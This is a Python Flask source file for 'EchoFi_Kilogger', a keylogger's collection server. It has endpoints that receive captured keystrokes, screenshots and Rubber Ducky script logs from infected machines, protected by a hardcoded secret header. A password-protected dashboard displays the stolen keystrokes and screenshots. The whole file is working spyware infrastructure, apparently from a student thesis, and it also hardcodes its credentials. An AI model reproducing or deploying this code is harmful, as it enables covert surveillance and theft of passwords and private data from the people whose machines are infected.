from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_httpauth import HTTPBasicAuth
import os
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///echofi.db'
app.config['UPLOAD_FOLDER'] = 'static/screenshots'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
auth = HTTPBasicAuth()

# Secret key for API authentication
SECRET_KEY = "supersecretkey123"

# Database models
class Keystroke(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.String(20), nullable=False)
    key = db.Column(db.String(50), nullable=False)

class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.String(20), nullable=False)
    filepath = db.Column(db.String(100), nullable=False)

class DuckyLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.String(20), nullable=False)
    script = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(10), nullable=False)
    output = db.Column(db.Text)

# Authentication for web interface
users = {
    "admin": "thesis2023"
}

@auth.verify_password
def verify_password(username, password):
    return username in users and users[username] == password

# Check secret key for API requests
def check_secret_key():
    if request.headers.get('X-Secret-Key') != SECRET_KEY:
        logger.error("Unauthorized access attempt")
        return jsonify({"error": "Unauthorized access"}), 401
    return None

# API endpoints
@app.route('/upload/keystrokes', methods=['POST'])
def upload_keystrokes():
    error = check_secret_key()
    if error:
        return error
    try:
        data = request.json
        for keystroke in data['keystrokes']:
            new_keystroke = Keystroke(timestamp=keystroke['timestamp'], key=keystroke['key'])
            db.session.add(new_keystroke)
        db.session.commit()
        logger.info(f"Uploaded {len(data['keystrokes'])} keystrokes")
        return jsonify({"message": "Keystrokes uploaded successfully"}), 200
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error uploading keystrokes: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/upload/screenshot', methods=['POST'])
def upload_screenshot():
    error = check_secret_key()
    if error:
        return error
    try:
        if 'file' not in request.files:
            logger.error("No file part in request")
            return jsonify({"error": "No file part"}), 400
        file = request.files['file']
        timestamp = request.form['timestamp']
        if file.filename == '':
            logger.error("No file selected")
            return jsonify({"error": "No selected file"}), 400
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        # Store relative path for static serving
        db_filepath = os.path.join('screenshots', filename).replace('\\', '/')
        new_screenshot = Screenshot(timestamp=timestamp, filepath=db_filepath)
        db.session.add(new_screenshot)
        db.session.commit()
        logger.info(f"Screenshot {filename} uploaded to {filepath}")
        return jsonify({"message": "Screenshot uploaded successfully"}), 200
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error uploading screenshot: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/upload/ducky', methods=['POST'])
def upload_ducky():
    error = check_secret_key()
    if error:
        return error
    try:
        data = request.json
        new_ducky_log = DuckyLog(
            timestamp=data['timestamp'],
            script=data['script'],
            status=data['status'],
            output=data['output']
        )
        db.session.add(new_ducky_log)
        db.session.commit()
        logger.info("Ducky log uploaded")
        return jsonify({"message": "Ducky log uploaded successfully"}), 200
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error uploading ducky log: {e}")
        return jsonify({"error": str(e)}), 500

# Dashboard route
@app.route('/')
@auth.login_required
def dashboard():
    try:
        logger.info("Fetching dashboard data")
        recent_keystrokes = Keystroke.query.order_by(Keystroke.id.desc()).limit(18).all()
        recent_screenshots = Screenshot.query.order_by(Screenshot.id.desc()).limit(7).all()
        recent_ducky_logs = DuckyLog.query.order_by(DuckyLog.id.desc()).limit(7).all()
        logger.info(f"Keystrokes: {len(recent_keystrokes)}, Screenshots: {len(recent_screenshots)}, Ducky: {len(recent_ducky_logs)}")
        return render_template('dashboard.html', 
                             keystrokes=recent_keystrokes, 
                             screenshots=recent_screenshots, 
                             ducky_logs=recent_ducky_logs,
                             server_name='EchoFi_Kilogger_Primo V1.0')
    except Exception as e:
        logger.error(f"Dashboard error: {e}")
        return render_template('dashboard.html', error=str(e))

if __name__ == '__main__':
    if not os.path.exists(app.config['UPLOAD_FOLDER']):
        os.makedirs(app.config['UPLOAD_FOLDER'])
    with app.app_context():
        db.create_all()
    logger.info("Starting EchoFi_Kilogger Server")
    app.run(host='0.0.0.0', port=5000, debug=False)